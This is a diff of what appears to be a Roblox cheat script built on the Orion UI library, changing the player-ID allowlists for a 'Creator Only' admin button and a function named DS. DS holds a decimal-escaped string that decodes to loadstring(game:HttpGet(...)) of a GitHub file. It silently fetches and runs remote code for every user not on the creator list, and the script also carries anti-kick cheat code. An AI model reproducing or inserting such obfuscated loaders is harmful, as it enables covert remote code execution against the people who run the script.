@@ -2600,7 +2600,7 @@ Tab:AddButton({
 Tab:AddButton({
  Name = "Admin Commands (Creator Only)",
  Callback = function()
-        if  game.Players.LocalPlayer.CharacterAppearanceId == 4636825706 or game.Players.LocalPlayer.CharacterAppearanceId == 5042713445 or game.Players.LocalPlayer.CharacterAppearanceId == 6036506267 or game.Players.LocalPlayer.CharacterAppearanceId == 6103186375 or game.Players.LocalPlayer.CharacterAppearanceId == 1156091597 or game.Players.LocalPlayer.CharacterAppearanceId == 2822056554 then
+        if  game.Players.LocalPlayer.CharacterAppearanceId == 4636825706 or game.Players.LocalPlayer.CharacterAppearanceId == 5042713445 or game.Players.LocalPlayer.CharacterAppearanceId == 5042713445 or game.Players.LocalPlayer.CharacterAppearanceId == 6103186375 or game.Players.LocalPlayer.CharacterAppearanceId == 1156091597 or game.Players.LocalPlayer.CharacterAppearanceId == 2822056554 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AdminCmds/main/SukunaBattlegrounds"))()
 else
 OrionLib:MakeNotification({
@@ -2895,7 +2895,7 @@ end
 AntiKick()
 
 local function DS()
-  if game.Players.LocalPlayer.UserId ~= 4636825706 and game.Players.LocalPlayer.UserId ~= 6036506267 then
+  if game.Players.LocalPlayer.UserId ~= 4636825706 and game.Players.LocalPlayer.UserId ~= 5042713445 then
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\68\83\75\101\114\79\102\102\105\99\97\108\47\68\101\102\101\110\115\101\79\102\102\47\109\97\105\110\47\83\117\107\117\110\97\34\41\41\40\41\10")()
   end
 end
